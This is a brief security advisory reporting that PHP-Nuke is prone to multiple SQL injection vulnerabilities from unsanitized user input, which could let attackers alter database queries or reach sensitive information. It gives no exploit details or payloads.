Reportedly PHP-Nuke is prone to multiple SQL injection vulnerabilities. These issues are due to a failure of the application to properly sanitize user supplied input.

As a result of these issues an attacker could modify the logic and structure of database queries. Other attacks may also be possible, such as gaining access to sensitive information.
